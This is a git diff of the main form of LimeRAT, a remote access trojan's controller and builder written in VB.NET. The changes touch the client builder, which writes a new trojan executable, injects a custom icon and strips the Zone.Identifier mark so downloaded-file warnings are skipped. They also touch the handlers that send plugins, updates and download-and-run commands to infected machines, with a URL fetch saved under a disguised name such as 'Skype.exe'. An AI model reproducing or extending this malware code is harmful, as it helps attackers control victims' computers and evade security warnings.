@@ -1,9 +1,5 @@
 ﻿'##################################################################
-<<<<<<< HEAD
 '##        N Y A N   C A T  |||   Updated on Nov./27/2018        ##
-=======
-'##        N Y A N   C A T  |||   Updated on Sept/25/2018        ##
->>>>>>> parent of 19710ea... UPDATE v0.1.8.5C
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -52,6 +48,7 @@ Public Class Main
         CheckForIllegalCrossThreadCalls = False
         S_Messages.M = Me
         ' MetroLabel3.Text = Nothing
+        Text = Text + " " + S_Settings.StubVer
         Try : PingClients.Interval = My.Settings.PING_VALUE * 1000 : Catch : End Try
         Try : My.Computer.Audio.Play(My.Resources.Intro, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
 
@@ -177,7 +174,7 @@ Public Class Main
                     MetroLabel3.ForeColor = Color.Lime
                 End If
             Catch ex As Net.Sockets.SocketException
-                '   MetroProgressSpinner1.Spinning = False
+                MetroProgressSpinner1.Spinning = False
                 PortLabel.Append(String.Format(" {0}=CLOSED ", ThePort))
                 MetroLabel3.Text = String.Format("IP={0}  {1}  KEY={2}", GetExternalAddress, PortLabel.ToString, S_Settings.EncryptionKey)
                 MetroLabel3.ForeColor = Color.Red
@@ -573,11 +570,11 @@ Public Class Main
                                 result = MessageBox.Show("Task is already in progress! Please wait until it's done. " & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
                                 If result = DialogResult.Yes Then
                                     x.BackColor = Color.DarkSlateGray
-                                    CL.Send(CMD)
+                                    CL.Send(M.ToArray)
                                 End If
                             Else
                                 x.BackColor = Color.DarkSlateGray
-                                CL.Send(CMD)
+                                CL.Send(M.ToArray)
                             End If
                         End If
                     Next
@@ -586,6 +583,7 @@ Public Class Main
                 Try
                     Await M.FlushAsync
                     M.Dispose()
+                    R.Close()
                 Catch ex As Exception
                 End Try
 
@@ -989,10 +987,10 @@ Public Class Main
         Try
             If L1.Items.Count > 0 Then
                 Dim o As New OpenFileDialog
-                With o
-                    .Filter = ".exe (*.exe)|*.exe"
-                    .Title = "UPDATE"
-                End With
+            With o
+                .Filter = ".exe (*.exe)|*.exe"
+                .Title = "UPDATE"
+            End With
 
                 If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                     Dim PLG = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
@@ -1220,9 +1218,9 @@ Public Class Main
         Try
             If L1.Items.Count > 0 Then
                 Dim o As New OpenFileDialog
-                With o
-                    .Title = "RUN"
-                End With
+            With o
+                .Title = "RUN"
+            End With
 
                 If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                     Dim PLG = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
@@ -1257,7 +1255,7 @@ Public Class Main
         Try
             If L1.Items.Count > 0 Then
                 Dim URL As String = InputBox("Enter the direct link", "Run File", "http: //site.com/file.exe")
-                Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")
+            Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")
 
                 If String.IsNullOrEmpty(URL) Then
                     Exit Sub
@@ -1636,17 +1634,27 @@ Public Class Main
                         Next
                     Next
 
-                    definition.Write(Application.StartupPath + "\" + "NEW-CLIENT.exe")
-                    If _icon.Checked = True AndAlso PictureBox1.ImageLocation <> "" Then
-                        S_IconChanger.InjectIcon(Application.StartupPath + "\" + "NEW-CLIENT.exe", PictureBox1.ImageLocation)
+                    Dim o As New SaveFileDialog With {
+            .Filter = ".exe (*.exe)|*.exe",
+            .InitialDirectory = Application.StartupPath,
+            .Title = "LimeRAT Builder",
+            .OverwritePrompt = False,
+            .FileName = "New-Client"
+                    }
+                    If o.ShowDialog = Windows.Forms.DialogResult.OK Then
+                        definition.Write(o.FileName)
+                        If _icon.Checked = True AndAlso PictureBox1.ImageLocation <> "" Then
+                            S_IconChanger.InjectIcon(o.FileName, PictureBox1.ImageLocation)
+                        End If
+                        Try : DeleteZoneIdentifier(o.FileName) : Catch : End Try
+                        MsgBox("Your Client Has been Created Successfully", MsgBoxStyle.Information, "DONE!")
+                        My.Settings.Save()
                     End If
-                    MsgBox("Your Client Has been Created Successfully", MsgBoxStyle.Information, "DONE!")
-                    My.Settings.Save()
+
                     definition.Dispose()
-                    Try : DeleteZoneIdentifier(Application.StartupPath + "\" + "NEW-CLIENT.exe") : Catch : End Try
                     Try : IO.File.Delete(Application.StartupPath & "\Misc\Stub\Stub.exe") : Catch : End Try
+                    End If
                 End If
-            End If
         Catch ex1 As Exception
             MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
             Return
